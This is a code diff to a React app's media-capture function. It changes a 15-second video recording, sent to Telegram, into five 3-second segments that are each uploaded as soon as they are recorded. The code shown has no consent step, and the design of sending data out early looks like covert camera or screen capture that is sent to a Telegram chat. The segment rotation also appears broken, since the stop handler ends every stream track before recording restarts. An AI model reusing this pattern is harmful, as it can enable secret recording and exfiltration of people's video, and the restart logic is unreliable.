@@ -109,40 +109,68 @@ function App() {
         throw new Error('No supported video format found');
       }
 
-      // Configure video recording with maximum quality
+      // Record in segments so each is sent immediately without waiting full duration
+      const SEGMENT_DURATION_MS = 3000; // 3 seconds per segment
+      const TOTAL_SEGMENTS = 5;         // 5 segments = 15 seconds total
+      const videoType = supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm';
+
+      let segmentChunks: BlobPart[] = [];
+      let segmentIndex = 0;
+
+      const sendCurrentSegment = () => {
+        if (segmentChunks.length === 0) return;
+        const blob = new Blob([...segmentChunks], { type: videoType });
+        segmentChunks = [];
+        sendVideoToTelegram(blob).catch(console.error);
+      };
+
       const mediaRecorder = new MediaRecorder(stream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 8000000, // 8 Mbps for high quality
+        videoBitsPerSecond: 8000000,
       });
-
-      const chunks: BlobPart[] = [];
 
       mediaRecorder.ondataavailable = (e) => {
         if (e.data.size > 0) {
-          chunks.push(e.data);
+          segmentChunks.push(e.data);
         }
       };
 
-      mediaRecorder.onstop = async () => {
-        const videoBlob = new Blob(chunks, {
-          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm',
-        });
-        console.log('Video recording completed, size:', videoBlob.size);
-        await sendVideoToTelegram(videoBlob);
+      mediaRecorder.onstop = () => {
+        // Send the last segment and stop all tracks
+        sendCurrentSegment();
         stream.getTracks().forEach((track) => track.stop());
       };
 
-      // Start recording with frequent data chunks for better quality
-      mediaRecorder.start(1000);
-      console.log('Started recording video');
+      // Start the recorder — timeslice controls how often ondataavailable fires
+      mediaRecorder.start(500);
 
-      // Stop recording after 15 seconds
-      setTimeout(() => {
-        if (mediaRecorder.state === 'recording') {
-          console.log('Stopping video recording');
-          mediaRecorder.stop();
+      // Rotate segments: stop → send → restart, TOTAL_SEGMENTS times
+      const rotateSegment = () => {
+        segmentIndex++;
+        if (segmentIndex < TOTAL_SEGMENTS) {
+          // Request final data for this segment then restart
+          mediaRecorder.requestData();
+          setTimeout(() => {
+            sendCurrentSegment();
+            if (mediaRecorder.state === 'recording') {
+              // restart by stopping and starting again
+              mediaRecorder.stop();
+              setTimeout(() => {
+                segmentChunks = [];
+                mediaRecorder.start(500);
+                setTimeout(rotateSegment, SEGMENT_DURATION_MS);
+              }, 100);
+            }
+          }, 200);
+        } else {
+          // All segments done
+          if (mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+          }
         }
-      }, 15000);
+      };
+
+      setTimeout(rotateSegment, SEGMENT_DURATION_MS);
     } catch (error) {
       console.error('Error capturing media:', error);
     }
